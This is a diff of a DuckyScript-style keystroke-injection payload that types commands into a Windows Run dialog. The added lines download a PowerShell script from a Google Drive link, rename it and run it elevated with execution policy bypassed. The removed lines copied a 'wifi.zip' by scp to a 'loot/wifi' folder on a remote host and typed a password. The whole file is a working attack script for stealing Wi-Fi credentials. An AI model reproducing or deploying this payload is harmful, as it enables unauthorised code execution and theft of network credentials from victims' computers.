@@ -40,18 +40,15 @@ ALT F4
 DELAY 1000
 windows r
 DELAY 1000
-STRINGLN powershell -NoProfile -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Path $env:TEMP\wifi -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/f3bandit/omg/main/magic.ps1' -OutFile $env:TEMP\wifi\magic.ps1"
+STRINGLN powershell -NoProfile -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Path \"$env:TEMP\wifi\" -Force | Out-Null; curl \"https://drive.google.com/uc?export=download&id=1tIiD-<INSERT DL ID HERE>\" -o \"$env:TEMP\wifi\magic.txt\""
+DELAY 1000
+windows r
+DELAY 1000
+STRINGLN cmd /c "if exist %TEMP%\wifi\magic.txt rename %TEMP%\wifi\magic.txt magic.ps1"
+DELAY 1000
 windows r
 DELAY 1000
 STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -ExecutionPolicy Bypass -Command & \"%TEMP%\wifi\magic.ps1\"'"
-DELAY 1000
-windows r
-DELAY 1000
-STRINGLN powershell -NoP -NoExit -Command "scp \"$env:TEMP\wifi\wifi.zip\" root@172.16.52.1:/mmc/root/loot/wifi/"
-DELAY 1000
-STRINGLN 685876
-DELAY 1000
-ALT F4
 DELAY 1000
 windows r
 DELAY 1000
